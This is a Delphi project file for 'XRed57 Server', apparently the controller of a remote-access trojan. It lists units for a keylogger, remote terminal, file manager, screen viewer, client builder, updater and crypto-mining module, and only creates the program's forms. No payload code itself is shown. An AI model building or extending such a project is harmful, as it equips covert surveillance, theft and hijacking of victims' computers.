program XServer;

uses
  Forms,
  Server in 'Server.pas' {FormServer},
  SettingsManager in 'SettingsManager.pas' {FormSettings},
  uFunctions in 'uFunctions.pas',
  uTypes in 'uTypes.pas',
  ClientScreen in 'ClientScreen.pas' {ScreenForm},
  ClientTerminal in 'ClientTerminal.pas' {TerminalForm},
  ClientInformation in 'ClientInformation.pas' {InformationForm},
  ClientFileManager in 'ClientFileManager.pas' {FileManagerForm},
  NewClient in 'NewClient.pas' {FormNewClient},
  NewUpdate in 'NewUpdate.pas' {FormNewUpdate},
  uList in 'uList.pas',
  uSockets in 'uSockets.pas',
  uThread in 'uThread.pas',
  ClientKeylogger in 'ClientKeylogger.pas' {KeyloggerForm},
  ClientPE in 'ClientPE.pas' {PEForm},
  ClientPreview in 'ClientPreview.pas' {PreviewForm},
  ClientNotepad in 'ClientNotepad.pas' {ClientNotepadForm},
  ClientMining in 'ClientMining.pas' {MiningForm},
  uEnc in '..\Client\uEnc.pas',
  PE_Files in 'PE_Files.pas',
  uEof in '..\Client\uEof.pas',
  PJResFile in 'PJResFile.pas';

{$R *.res}
{$R XClient.res}

begin
  Application.Initialize;
  Application.Title := 'XRed57 Server';
  Application.CreateForm(TFormServer, FormServer);
  Application.CreateForm(TFormSettings, FormSettings);
  Application.CreateForm(TPEForm, PEForm);
  Application.CreateForm(TPreviewForm, PreviewForm);
  Application.CreateForm(TClientNotepadForm, ClientNotepadForm);
  Application.CreateForm(TMiningForm, MiningForm);
  Application.Run;
end.
